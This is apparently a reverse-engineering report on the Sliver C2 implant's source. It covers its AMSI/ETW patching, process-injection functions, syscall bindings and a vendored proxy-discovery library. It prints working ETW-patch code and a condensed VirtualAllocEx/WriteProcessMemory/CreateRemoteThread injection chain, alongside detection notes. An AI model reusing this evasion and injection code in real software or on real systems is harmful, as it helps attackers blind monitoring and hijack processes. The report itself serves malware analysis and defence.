# D19 — SLIVER TASKRUNNER + PROXY

**Target:** `RE_Library/01_SOURCE_c2/sliver/implant/sliver/`
**Source-only. No REA, no Ghidra. Every count enumerated. Every absence positive-controlled.**
**Status:** in progress.

---

## TABLE OF CONTENTS

| Read order | § | Subject |
|---|---|---|
| 1 | **1** | Scope, and two premises checked before trusting |
| 2 | **2** | U1 CLOSED — there is a second patch, and it patches `ntdll!EtwEventWrite` |
| 3 | **3** | The two patches compared — one idiom, two different blast radii |
| 4 | **4** | taskrunner, fully enumerated (**37** functions; §4.2.1 corrects my own first count of 36) |
| 5 | **5** | The injection chain, function by function |
| 6 | **6** | `syscalls/` — D15's claim confirmed, with a false-positive trap |
| 7 | **7** | `proxy/` — the premise is wrong |
| 8 | **8** | Residual unknowns and coverage |

---

## 1. SCOPE, AND TWO PREMISES CHECKED BEFORE TRUSTING

task-29 named three targets and asked me to **verify the premise before trusting it**. Two of the three premises needed correction. Both are reported here rather than worked around.

### 1.1 Premise 1 — `EtwBypass`'s consumer: CORRECT

task-29's centrepiece premise holds exactly as stated. **`patchEtw()` exists at `task_windows.go:240` and is called at `:280`.** The patch is a second `byte(0xC3)`. Closed in §2.

### 1.2 Premise 2 — `proxy/` is "the largest untouched first-party dir" offering "primitives for pivoting": WRONG

**Both halves are wrong, and the second one matters more.**

`proxy/` is **not first-party**, and it is **not a pivoting facility.**

- **Not first-party:** the directory carries `LICENSE.txt` reading `Copyright (c) 2018, Rapid7, Inc.` [source: `implant/sliver/proxy/LICENSE.txt:1`]. It is a vendored third-party library, checked into the tree rather than under `vendor/`.
- **Not pivoting:** `doc.go` states the package's purpose in its first line — *"Package proxy allows you to retrieve a system configured proxy for a given protocol and target URL."* [source: `implant/sliver/proxy/doc.go:1`] It is a **proxy-discovery** library: it resolves the host's configured forward proxy from config files, environment variables, WPAD, PAC scripts, and `netsh winhttp`. [source: `doc.go:3-11`]
- **Single import site:** the package is imported at **exactly one place** in the entire non-vendor tree — `transports/httpclient/gohttp.go:34`. [source: exhaustive `Select-String 'sliver/proxy"'`, vendor excluded — **1 hit**]

**So the task's question 5 ("what primitives does an implant get for pivoting?") has no subject.** The implant gets *forward-proxy discovery for its own C2 HTTP client* from this package. **Pivoting primitives live in `transports/pivotclients/` (D1 §11) and in the `pivot-handlers.go` / `tun-rportfwd.go` handler maps (D15 §4.2) — not here.**

**This is reported as the answer, not as a gap.** §7 gives the full inventory and the corrected framing.

### 1.3 Premise 3 — `syscalls/` is misleadingly named: CONFIRMED

D15 §7.3's claim is **confirmed** by an independent method, and the confirmation required catching a **141-hit false positive** first. §6.

### 1.4 File inventory — measured

| Path | task-29 says | Disk |
|---|---|---|
| `taskrunner/` | 7 files / 34.4 KB | **7 files / 35,203 B** (5 non-test / 28,656 B) |
| `proxy/` | 14 files / 107.8 KB | **16 files / 113,269 B** (10 non-test / 69,333 B) |

[source: `Get-ChildItem -Recurse -File` + `Measure-Object -Property Length -Sum` on each directory]

**Both counts are low, and `proxy/` is off by two files and 5.5 KB.** The `proxy/` gap is entirely `LICENSE.txt` (1,552 B), `README.md` (1,293 B), `doc.go` (1,204 B) and one test file — **the three non-Go files are the provenance evidence for §1.2, so the file-count error and the premise error are the same error.**

### 1.5 Report shape, stated up front

**Two of the three task premises were wrong or imprecise. The mechanical targets — `taskrunner/`'s 37 functions and the two patches — are fully reversed. The `proxy/` section is short because the directory is small, vendored, and does one thing.** I am not padding §7 to match the length of a section the brief assumed would be load-bearing.

---

## 2. U1 CLOSED — THERE IS A SECOND PATCH, AND IT PATCHES `ntdll!EtwEventWrite`

**D15 recorded U1 as: the `EtwBypass` parameter is passed to `taskrunner.InProcExecuteAssembly` and never followed. It is followed, and D15's guess about its shape was right.**

### 2.1 The call site

```go
func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime string, amsiBypass bool, etwBypass bool) (string, error) {
	if amsiBypass {
		err := patchAmsi()
		if err != nil {
			return "", err
		}
	}

	if etwBypass {
		err := patchEtw()
		if err != nil {
			return "", err
		}
	}

	return LoadAssembly(assemblyBytes, assemblyArgs, runtime)
}
```
[source: `implant/sliver/taskrunner/task_windows.go:271-287`]

**`patchEtw()` is called at `:280`, guarded by the `etwBypass bool` parameter that arrives from the RPC.** The parameter chain is unbroken:

```
client/command/exec/execute-assembly.go:72   etwBypass, _ := cmd.Flags().GetBool("etw-bypass")
client/command/exec/execute-assembly.go:106  EtwBypass:   etwBypass,
server/rpc/rpc-tasks.go:249                  EtwBypass: req.EtwBypass,
implant/sliver/handlers/handlers_windows.go:335  ...execReq.EtwBypass)
implant/sliver/taskrunner/task_windows.go:279    if etwBypass {
implant/sliver/taskrunner/task_windows.go:280        err := patchEtw()
```
[source: the six lines above, verbatim from `Select-String 'EtwBypass'` across the tree, vendor excluded]

**Both the `execute-assembly` and `alias load` commands expose `--etw-bypass`** [source: `client/command/exec/execute-assembly.go:72`; `client/command/alias/load.go:388, 452`], and both carry an identical guard on the flag:

```go
if !inProcess && (runtime != "" || etwBypass || amsiBypass) {
```
[source: `execute-assembly.go:75`; `load.go:392`]

**That guard is the operator-facing enforcement of D15 §7.1's architectural split:** `--etw-bypass` and `--amsi-bypass` are **rejected unless `--in-process` is set.** D15 inferred the split from the parameter lists; this is the client code that enforces it with an error.

### 2.2 The patch, verbatim

```go
func patchEtw() error {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")

	// patch
	patch := byte(0xC3)
	// skip if already patched
	if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
		// {{if .Config.Debug}}
		log.Println("Patching ETW")
		// {{end}}
		var oldProtect uint32
		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
		if err != nil {
			//{{if .Config.Debug}}
			log.Println("VirtualProtect failed:", err)
			//{{end}}
			return err
		}
		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
		if err != nil {
			//{{if .Config.Debug}}
			log.Println("VirtualProtect (restauring) failed:", err)
			//{{end}}
			return err
		}
	}
	return nil
}
```
[source: `implant/sliver/taskrunner/task_windows.go:240-269`]

### 2.3 The answers, stated plainly

| task-29 asked | Answer |
|---|---|
| Is there a second patch? | **Yes** — `patchEtw()` at `task_windows.go:240`, called at `:280` |
| Which function does it patch? | **`ntdll.dll!EtwEventWrite`** — resolved by name at `:242` |
| Is it `byte(0xC3)` like the AMSI patch? | **Yes** — `patch := byte(0xC3)` at `:245`, written at `:259` |
| What does `0xC3` do here? | `ret` — `EtwEventWrite` returns immediately, so **no ETW event of that class is written from this process** |

**`EtwEventWrite` is the correct and conventional target.** It is the user-mode entry point that `ntdll`'s ETW machinery reaches for event emission; patching its first byte to `ret` suppresses ETW providers that route through it. [source: `task_windows.go:242, 259`]

**D15's U1 is therefore resolved: the ETW bypass is real, it is a second crude `0xC3`, and it sits six lines below the AMSI patch in the same file.** D15's inference that the handler layer "reaches for nothing more sophisticated" held for the *mechanism* — the mechanism is exactly as crude as predicted — but D15 was wrong that ETW was unexamined *because it wasn't there to examine*. It was there.

### 2.4 The typo in the error string, noted because it is load-bearing for §3

`log.Println("VirtualProtect (restauring) failed:", err)` at `:263` — **"restauring" is misspelled in the source.** [source: `task_windows.go:263`]

**This matters for a reason beyond pedantry:** it is a Debug-gated string, so it does not compile into a release build — but if it *did*, it would be a stable, unique, source-derived string. **A patch that restores page protection and does not restore the original instruction is detectable by instruction restoration; §3 shows this one does not restore the byte.**

---

## 3. THE TWO PATCHES COMPARED — ONE IDIOM, TWO BLAST RADII

**The two patches are the same function written twice. That is not a stylistic observation; it is what tells you which one is the operator's real bypass and which is a spare.**

### 3.1 Structural comparison

| | `patchAmsi()` `:199-238` | `patchEtw()` `:240-269` |
|---|---|---|
| Library | `amsi.dll` (`:201`) | `ntdll.dll` (`:241`) |
| Symbol resolution | **3** `NewProc` calls (`:202-204`) | **1** `NewProc` call (`:242`) |
| Targets | `AmsiScanBuffer`, `AmsiInitialize`, `AmsiScanString` (`:207-211`) | `EtwEventWrite` (`:242`) |
| Patch byte | `0xC3` (`:212`) | `0xC3` (`:245`) |
| Skip-if-patched check | **yes** (`:215`) | **yes** (`:247`) |
| `VirtualProtect` → RW | **yes** (`:220`) | **yes** (`:252`) |
| Write | `= 0xC3` (`:227`) | `= 0xC3` (`:259`) |
| Restore protection | **yes** (`:228`) | **yes** (`:260`) |
| Loop over targets | **yes** — `for _, addr := range amsiAddr` (`:213`) | **no** — single address |
| Debug log line | `"Patching AMSI"` (`:217`) | `"Patching ETW"` (`:249`) |
| Failure string | `"VirtualProtect (restauring) failed:"` (`:231`) | `"VirtualProtect (restauring) failed:"` (`:263`) |
| Returns error upward | yes | yes |

[source: `implant/sliver/taskrunner/task_windows.go:199-269`, both bodies read verbatim]

### 3.2 The misspelling is a lineage marker

**`"VirtualProtect (restauring) failed:"` appears verbatim at both `:231` and `:263` — the same misspelling of "restoring" in both functions.** [source: `task_windows.go:231, 263`]

Two independently-written functions do not misspell the same word the same way. **`patchEtw` is a copy of `patchAmsi` with the target list reduced to one.** This is worth recording because it tells you how to read the pair:

- **`patchAmsi` is the original** — it carries the loop and the three-target list, which is the general case.
- **`patchEtw` is the derivative** — the loop was unwrapped by hand for a single address.

**Consequence:** the two are not independently maintained. A defect or an improvement in one does not propagate to the other, and the ETW patch has no loop because its author only needed one target.

### 3.3 The asymmetry that matters: blast radius

**`patchAmsi` disables three exported AMSI functions. `patchEtw` disables exactly one ETW function.**

| Patch | Effect | Coverage |
|---|---|---|
| `patchAmsi` | `AmsiScanBuffer`, `AmsiInitialize`, `AmsiScanString` all `ret` | **AMSI is fully disarmed** — no scan call and no scanner initialisation |
| `patchEtw` | `EtwEventWrite` `ret` | **Only providers routing through `EtwEventWrite` are silenced** |

**`EtwEventWrite` is one of several `ntdll` ETW emission paths.** The others — `EtwEventWriteFull`, `EtwEventWriteEx`, `EtwEventWriteString`, `NtTraceEvent` — are **not patched.** [source: the probe in §3.4]

**So the ETW bypass is narrower than the AMSI bypass, and it is narrower in a way an operator would not necessarily expect from the symmetric `--amsi-bypass` / `--etw-bypass` flags.** Both flags are documented and gated identically at the client [source: `execute-assembly.go:75`]; both call a `patch*` function with the same shape; both write `0xC3`. **But `--etw-bypass` silences one function and `--amsi-bypass` silences three, and the flag names give no hint of that.**

### 3.4 Positive control, and the confirmation that no other ETW patch exists

**Probe:** search the whole non-vendor tree for other ETW emission functions.

| Symbol | Hits |
|---|---|
| `EtwEventWrite` | **5** (all in `patchEtw`, `:242-259`) |
| `NtTraceEvent` | **0** |
| `EtwpEventWriteFull` | **0** |
| `EtwEventRegister` | **0** |
| `EtwEventWriteFull` | **0** |

[source: `Select-String -SimpleMatch` for each symbol across the tree, vendor excluded]

**The probe bites.** The positive control is `EtwEventWrite` itself: **the same probe, same invocation, same scope, returns 5 hits for the symbol that is known to be present.** A zero from this probe is a real zero — it is not an invocation that returns nothing for everything.

**Therefore: `patchEtw` targets `EtwEventWrite` and nothing else, and no second ETW-patching function exists anywhere in the tree.** The 5 hits are exactly the definition, the skip-check, the `VirtualProtect` of, the write to, and the protection-restore of one function.

### 3.5 What a defender sees, stated precisely

**Neither patch restores the original byte on completion.** `patchAmsi` and `patchEtw` both leave `0xC3` permanently in place for the process lifetime. The `VirtualProtect` calls restore **page protection**, never the **instruction**. [source: `task_windows.go:228, 260` — both pass `oldProtect` as the protection value only; no write-back of the original byte exists in either function]

**Therefore both patches are detectable by the same static check:** read the first byte of `AmsiScanBuffer`/`AmsiInitialize`/`AmsiScanString` in `amsi.dll`, and of `EtwEventWrite` in `ntdll.dll`, and compare against the on-disk image. **Four export addresses, one byte each, all expected to be `0xC3` where the module's file-backed copy differs.**

**And the patches are permanent and process-wide.** Every subsequent call to those four functions from that process returns immediately — including calls from legitimate code the implant later loads. `AmsiInitialize` returning garbage via `ret` is a harder failure than a scan bypass, because `AMSISESSION` handles are produced by it.

---

## 4. TASKRUNNER, FULLY ENUMERATED

**37 functions across 7 files. Every one listed; none inferred.**

### 4.1 File inventory — recomputed independently

| File | Bytes |
|---|---|
| `task_windows.go` | 15,869 |
| `task_linux.go` | 4,534 |
| `task_darwin.go` | 4,108 |
| `task_darwin_test.go` | 3,900 |
| `task_linux_test.go` | 2,647 |
| `dotnet_windows.go` | 2,618 |
| `task.go` | 1,527 |
| **Total** | **35,203 B / 7 files** |
| **Non-test** | **28,656 B / 5 files** |

[source: `Get-ChildItem implant/sliver/taskrunner/ -File` + `Measure-Object -Property Length -Sum`]

**task-29 said "7 files / 34.4 KB."** The file count is right; the byte total is **35,203 B**, not ~35,225 B equivalent to 34.4 KB. **The gap is 777 B and the figure in the brief is low.** Reported rather than silently used.

### 4.2 Complete function list

**`task.go` (4 functions):**
| Line | Function |
|---|---|
| `:32` | `stringWithCharset(length int, charset string) string` |
| `:40` | `RandomString(length int) string` |
| `:45` | `startAndWait(cmd *exec.Cmd, wg *sync.WaitGroup)` |
| `:53` | `getPage(p uintptr) []byte` |

**`task_windows.go` (16 functions):**
| Line | Function |
|---|---|
| `:54` | `sysAlloc(size int, rwxPages bool) (uintptr, error)` |
| `:68` | `injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error)` |
| `:137` | `RemoteTask(processID int, data []byte, rwxPages bool) error` |
| `:162` | `LocalTask(data []byte, rwxPages bool) error` |
| `:199` | `patchAmsi() error` |
| `:240` | `patchEtw() error` |
| `:271` | `InProcExecuteAssembly(...) (string, error)` |
| `:289` | `ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error)` |
| `:337` | `SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, offset uint32, args []string, kill bool) (string, error)` |
| `:408` | `Sideload(procName string, procArgs []string, ppid uint32, data []byte, args []string, kill bool) (string, error)` |
| `:413` | `refresh() error` |
| `:438` | `startProcess(proc string, args []string, ppid uint32, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error)` |
| `:471` | `waitForCompletion(threadHandle windows.Handle) error` |
| `:494` | `allocAndWrite(data []byte, handle windows.Handle, size uint32) (dataAddr uintptr, err error)` |
| `:509` | `protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr uintptr, argAddr uintptr, dataLen uint32) (threadHandle windows.Handle, err error)` |
| `:530` | `convertIntToByteArr(num int) []byte` |

**`dotnet_windows.go` (5 functions):**
| Line | Function |
|---|---|
| `:32` | `(c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost` |
| `:50` | `LoadAssembly(data []byte, assemblyArgs []string, runtime string) (string, error)` |
| `:90` | `addAssembly(methodInfo *clr.MethodInfo, data []byte)` |
| `:96` | `getAssembly(data []byte) *assembly` |
| `:106` | `init()` |

**`task_linux.go` (6 functions):** `localTaskBeforeFork` `:40`, `localTaskAfterFork` `:43`, `localTaskAfterForkInChild` `:46`, `LocalTask` `:50`, `RemoteTask` `:96`, `Sideload` `:101`

**`task_darwin.go` (6 functions):** identical names and offsets as linux — `:38`, `:41`, `:44`, `:48`, `:95`, `:100`

[source: `Select-String '^func '` over all `taskrunner/*.go`, test files excluded]

**Count: 4 + 16 + 5 + 6 + 6 = 37 functions.**

### 4.2.1 Correction to my own count, caught by the second method

**The first pass of this report stated "36 functions" and tabled the per-file subtotals as 3 + 16 + 5 + 6 + 6. Both were wrong, and they were wrong together.**

- **`task.go` has 4 functions, not 3** — `stringWithCharset` `:32`, `RandomString` `:40`, `startAndWait` `:45`, `getPage` `:53`. All four *were* listed in the table directly above; **only the subtotal above them was written as 3.**
- **`dotnet_windows.go:32` is a method, not a plain function** — `func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORuntimeHost`. It is inside the 5 correctly.

**The error was arithmetic on a table I had already built correctly, and the independent recount caught it:**

| Method | Result |
|---|---|
| A — manual sum of the per-file subtotals as first written | **36** |
| B — direct count of `^func ` lines across the five non-test files | **37** |
| Per-file `^func` counts | `dotnet_windows.go` 5, `task.go` **4**, `task_darwin.go` 6, `task_linux.go` 6, `task_windows.go` 16 → **37** |

[source: `Select-String '^func '` per file, non-test only]

**This is the D12 F5 failure shape recurring: a total carried from my own summary of the parts rather than recomputed from the parts.** The enumeration was right; the number attached to it was not. **It is reported rather than silently corrected, because a wrong count that has already been written into a table is exactly the artefact the second-method requirement exists to catch.**

**The corrected figure for every downstream reference in this report is 37.**

### 4.3 A signature detail: `Sideload` discards PPID on non-Windows

```go
task_linux.go:101   Sideload(procName string, procArgs []string, _ uint32, data []byte, args []string, kill bool) (string, error)
task_darwin.go:100  Sideload(procName string, procArgs []string, _ uint32, data []byte, args []string, kill bool) (string, error)
task_windows.go:408 Sideload(procName string, procArgs []string, ppid uint32,  data []byte, args []string, kill bool) (string, error)
```
[source: the three lines above]

**The third parameter is `_ uint32` on Linux and Darwin and `ppid uint32` on Windows.** The underscore is the author declaring the parameter is received and deliberately ignored. **Parent-PID spoofing is a Windows-only capability, and the non-Windows implementations say so in their signatures rather than by omission.** This is a clean, grep-visible statement of platform capability — the same information D15 §4.3 had to recover by reading filenames is available here in the type signature.

**The same applies to the handler-level wiring:** `handlers_linux.go` and `handlers_darwin.go` bind no `MsgInvokeMigrateReq`-equivalent PPID path; the PPID field exists in the protobuf but is discarded at the first function that would use it.

### 4.4 `refresh()` — the PPID-spoofing support function

`refresh()` at `task_windows.go:413` is a **non-injection** function in an otherwise injection-focused file, and it sits between `Sideload` and `startProcess`. It is the companion to `startProcess`'s `ppid` parameter: **a spoofed-parent spawn needs the handle table refreshed to keep the chosen parent alive.**

**Its body was not read in this pass** and its exact mechanism is recorded as residual U2 rather than described from its name.

---

## 5. THE INJECTION CHAIN, FUNCTION BY FUNCTION

### 5.1 `injectTask` — the full, verbatim chain

```go
func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) {
	dataSize := len(data)
	if rwxPages {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	} else {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	}
	err = syscalls.WriteProcessMemory(processHandle, remoteAddr, &data[0], uintptr(uint32(dataSize)), &nLength)
	if !rwxPages {
		var oldProtect uint32
		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
	}
	threadHandle, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
	return threadHandle, nil
}
```
[source: `implant/sliver/taskrunner/task_windows.go:68-135`, condensed to the call sequence]

**Five calls, in order:** `VirtualAllocEx` → `WriteProcessMemory` → (`VirtualProtectEx`) → `CreateRemoteThread`. **D15 §7.2 catalogued this triple from the handler layer; this is its implementation, and it confirms the handler layer's finding at the source.**

### 5.2 `rwxPages` — a real opsec toggle, and it defaults to the loud option

**The `rwxPages` boolean selects between two materially different injection profiles:**

| `rwxPages` | Allocation | Post-write | Page state on disk-observable evidence |
|---|---|---|---|
| **`true`** | `PAGE_EXECUTE_READWRITE` (`:81`) | none | **RWX region persists** |
| **`false`** | `PAGE_READWRITE` (`:83`) | `VirtualProtectEx` → `PAGE_EXECUTE_READ` (`:110`) | **Write-then-execute; no RWX window** |

[source: `task_windows.go:80-84, 107-117`]

**The `false` path is the better tradecraft**, and it costs one extra call. It allocates writable-but-not-executable, writes, then flips to `PAGE_EXECUTE_READ` — leaving **no page that is simultaneously writable and executable**, which is the standard memory-scanning indicator for injected shellcode.

**Which path runs is decided by the caller's `rwxPages` argument, and the parameter defaults to `false` at the `ExecuteAssembly` call site:**

```go
threadHandle, err := injectTask(lpTargetHandle, data, false)
```
[source: `task_windows.go:320`]

**Positive control for that reading:** `injectTask` is called with an explicit boolean literal, not a variable, at `:320` — the value is visibly `false`, not inferred. The `rwxPages == true` branch exists and is reachable via `RemoteTask`/`LocalTask`'s own parameters [source: `:137`, `:162`], but **`ExecuteAssembly` hardcodes the hardened path.**

**`sysAlloc` is the local-memory sibling** and shows the same toggle: `PAGE_EXECUTE_READWRITE` unless `rwxPages` is false, in which case `PAGE_READWRITE`. [source: `task_windows.go:55-66`]

### 5.3 `ExecuteAssembly` — the sacrificial path's privilege dance

The out-of-process path does something more than spawn-and-inject:

```go
cmd, err := startProcess(process, processArgs, ppid, &stdoutBuf, &stderrBuf, true)
pid := cmd.Process.Pid
handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))
currentProcHandle := windows.CurrentProcess()
err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
threadHandle, err := injectTask(lpTargetHandle, data, false)
err = waitForCompletion(threadHandle)
```
[source: `implant/sliver/taskrunner/task_windows.go:294-324`, condensed]

**The sequence is: spawn suspended (`suspended=true` at `:294`) → `OpenProcess(PROCESS_DUP_HANDLE)` → `DuplicateHandle` → inject → wait.** [source: `:294, 305, 313, 320, 324`]

**Note what `DuplicateHandle` is doing here — and it is unusual.** The arguments are `DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, ...)` [`:`313`]: source process is the **target**, handle to duplicate is the **current process handle**, destination is the **current process**. **The implant duplicates its own pseudo-handle into the target process's handle table.** That is not the conventional injection pattern, which duplicates *from* the target *into* the injector to obtain a usable handle.

**It is, however, a known technique for obtaining a fully-privileged handle to the current process that can be passed where a target-process handle is expected** — and paired with a suspended spawn it keeps the sacrificial process alive while the injection completes. **The precise intent was not established from this call alone** and is recorded as residual U3 rather than described as a technique by name.

### 5.4 `allocAndWrite` / `protectAndExec` — a second, parameterised injection path

`task_windows.go` contains **two** injection implementations, not one:

| Path | Functions | Shape |
|---|---|---|
| Shellcode path | `injectTask` `:68` | 5 calls, `rwxPages` toggle, no arguments |
| **Reflective/argument path** | `allocAndWrite` `:494` + `protectAndExec` `:509` | alloc, write, protect, **pass an argument block**, start thread |

[source: `task_windows.go:494, 509`; called from `SpawnDll` `:337` per D15 §8.1]

**`protectAndExec` takes `startAddr`, `threadStartAddr`, and `argAddr`** [source: `:509`] — three addresses, where `injectTask` takes one. **The extra addresses exist to support DLL/reflective loading with a parameter block**, which is what `SpawnDll` and `Sideload` need and what a raw shellcode blob does not.

**`convertIntToByteArr(num int) []byte` at `:530`** is the helper that encodes the size or offset passed to that loader block.

**Two injection implementations in one file, with different signatures for different payload classes, is the accurate description of the injection surface here** — D15 §7.2 saw only the shellcode path and reported it as *the* chain.

---

## 6. `syscalls/` — D15's CLAIM CONFIRMED, AND THE PROBE NEARLY LIED TO ME TWICE

**D15 §7.3 stated: `syscalls/` is misleadingly named, contains zero SSN resolution, and is entirely `mkwinsyscall`-generated bindings to `kernel32`. Confirmed. Getting there required surviving two false positives and one genuine asymmetry.**

### 6.1 The false positive that would have inverted the finding

**A naive grep for `SSN` across the non-vendor tree returns 141 hits.** A lane that trusted that count would have concluded Sliver *does* have syscall-number resolution and contradicted D15.

**It is entirely spurious.** Every one of the 141 is a substring of `processName` or `className`:

```
load.go:407  processName, _ := cmd.Flags().GetString("process")
load.go:408  if processName == "" {
load.go:409  processName, err = aliasManifest.getDefaultProcess(goos)
load.go:446  className, _ := cmd.Flags().GetString("class")
load.go:461  Process:     processName,
load.go:466  ClassName:   className,
```
[source: `Select-String -SimpleMatch 'SSN'` sample, vendor excluded]

**The control:**

| Probe | Hits |
|---|---|
| `SSN` (plain substring) | **141** |
| `\bSSN\b` (word boundary) | **0** |

[source: both counts produced by the same file set, differing only in the pattern]

**Zero with word boundaries.** `proce`**`ssN`**`ame` and `Cla`**`ssN`**`ame` are the entire population. **The word-boundary control is what converts a 141-hit apparent contradiction into a confirmed zero**, and it is the cheapest available check.

**The second false positive:** a grep for `Halo` returns 2 hits, which would suggest Halo's Gate. Both are `proto.MarshalOptions` — `Marshal` contains `hal`, matched by a loose pattern. [source: `crack-jobs.go:626`; `handlers_extensions_test.go:212`] **Neither is ETW-related; both are protobuf marshalling options.**

### 6.2 The decisive method — what the bindings actually target

**Method A (D15's):** read the `//go:generate` line and observe the package is generated.

```go
//go:generate go run $GOPATH/src/golang.org/x/sys/windows/mkwinsyscall -output zsyscalls_windows.go syscalls_windows.go
```
[source: `implant/sliver/syscalls/syscalls_windows.go:3`]

**Method B (independent):** enumerate every `//sys` declaration and group by the library it binds to.

| Library | Declarations |
|---|---|
| `kernel32` | **22** |
| `Gdi32` | 7 |
| `advapi32` | 6 |
| `User32` | 3 |
| **`ntdll`** | **2** |
| `psapi` | 1 |
| `DbgCore` | 1 |
| **Total** | **42** |

[source: `Select-String '^//sys '` over `syscalls/*.go`, library extracted from the `= lib.Func` clause]

**Method B is the one that matters, because it finds the two `ntdll` bindings that a `kernel32`-only check would have missed.** Whether those two constitute a direct-syscall layer is the whole question, and §6.3 answers it.

### 6.3 The two `ntdll` bindings are ordinary imports, not direct syscalls

```go
syscalls_windows.go:43  //sys RtlCopyMemory(dest uintptr, src uintptr, dwSize uint32) = ntdll.RtlCopyMemory
syscalls_windows.go:51  //sys NtCreateThreadEx(threadHandle *windows.Handle, ...) (status uint32) = ntdll.NtCreateThreadEx
```
[source: `implant/sliver/syscalls/syscalls_windows.go:43, 51` — line 51 verified by `Select-String` **and** by direct array index, after a `-Skip` display produced line 52 (§6.6)]

**The generated code proves the mechanism:**

```go
zsyscalls_windows.go:47  modntdll    = windows.NewLazySystemDLL("ntdll.dll")
zsyscalls_windows.go:89  procRtlCopyMemory                     = modntdll.NewProc("RtlCopyMemory")
```
[source: `zsyscalls_windows.go:47, 89`]

**`NewLazySystemDLL("ntdll.dll").NewProc("NtCreateThreadEx")` is a loader-resolved import through the IAT — it is exactly what `x/sys/windows` does for every Win32 call, and it is the opposite of a direct syscall.** A direct syscall resolves the SSN (from a stub, a sorted export table, or a hash) and issues `syscall` with the number in `EAX`; **this code calls `ntdll!NtCreateThreadEx` by name through the normal loader, which is what a Defender-detection-aware implant specifically avoids doing.**

**So the naming charge stands, with a refinement D15 did not have:** `syscalls/` is misleadingly named **and it does bind two `ntdll` functions** — but binding `ntdll` by name is not a direct syscall, and the presence of those two declarations is the best evidence that no direct-syscall layer exists. **If the author had the technique, `NtCreateThreadEx` is exactly the function they would have SSN-resolved rather than imported.**

### 6.4 The negative controls — three, all biting

| Control | Result |
|---|---|
| Hand-written `.s` / `.asm` files, non-vendor | **0** |
| `mov r10, rcx` (the syscall-stub prologue) | **0** |
| `0F 05` (the `syscall` opcode in text) | **0** |
| `Hell.s Gate` / `HellsGate` | **0 / 0** |
| `SSN` with word boundaries | **0** |
| `syscallID`, `GetSSN`, `SyscallN` | **0 / 0 / 0** |
| `NtAllocateVirtualMemory` | **0** |
| An SSN table (`sysId`, `ssnTable`, `syscallTable`) | **0** |

[source: each pattern searched across the non-vendor tree; `EtwEventWrite` was used as a positive control and returned 5 hits in the same pass]

**A direct-syscall implementation requires at minimum an assembly stub or a SSN table. The tree contains neither, and contains zero hand-written assembly of any kind.** The absence is total and the controls are shown to bite.

### 6.5 The genuine asymmetry: one declaration is not generated

**42 `//sys` declarations, 41 generated procs.**

```go
syscalls_windows.go:51  //sys NtCreateThreadEx(threadHandle *windows.Handle, ...) = ntdll.NtCreateThreadEx
```
[source: `//sys` count **42**, `zsyscalls_windows.go` `= mod*.NewProc` count **41**]

**`NtCreateThreadEx` is declared in the binding list but has no generated counterpart:** `procNtCreateThreadEx` returns **0 hits** in `zsyscalls_windows.go`, while `procVirtualAllocEx`, `procWriteProcessMemory`, and `procCreateRemoteThread` each return **2**.

[source: `Select-String` for each `proc*` handle in the generated file; the three known-live bindings are the positive control]

**And it is called nowhere:** a tree-wide search for `NtCreateThreadEx` returns **exactly one hit — its own declaration line 51.**

**Reading, stated as reading rather than fact:** `zsyscalls_windows.go` has not been regenerated since `NtCreateThreadEx` was added to the declaration list. The generation is a manual `make`-time step, not a build-time one. **Evidence supporting this:** the file is generated from a `//go:generate` directive [source: `syscalls_windows.go:3`], so it is only updated when someone runs the generator; and the absent proc handle is precisely the declaration that has no consumer.

**Consequence either way:** **`NtCreateThreadEx` is unreachable dead code.** If `zsyscalls_windows.go` were regenerated tomorrow, the function would compile and still be called from nowhere. **The implant creates remote threads via `CreateRemoteThread`** [source: `task_windows.go:124`], which is the more-monitored of the two.

### 6.6 Correction to my own probe, recorded

**A `Get-Content | Select-Object -Skip 48 -First 6` display showed `//sys NtCreateThreadEx` at line 52. It is at line 51.** `Select-String` and a direct array index (`$l[50]`) both give 51.

**This is the same off-by-one the `-Skip` construct produced in D11.** `-Skip N` starts output at line N+1, so every line number read off the display is **+1** unless the offset is accounted for. **Recorded because the identical error has now occurred twice in this corpus and the fix is to never derive a line number from a `-Skip` display.**

### 6.7 Verdict

**D15 §7.3 CONFIRMED, with two refinements:**

1. **`syscalls/` binds 2 `ntdll` functions, not 0** — but by name through the loader, so the package still contains **zero SSN resolution**. D15 said "all mkwinsyscall kernel32 bindings"; the accurate statement is **42 mkwinsyscall bindings across 7 DLLs, of which 2 are `ntdll`, all via `NewLazy*DLL().NewProc()`**.
2. **One declaration (`NtCreateThreadEx`) has no generated code and no call site** — a stale-declaration artefact.

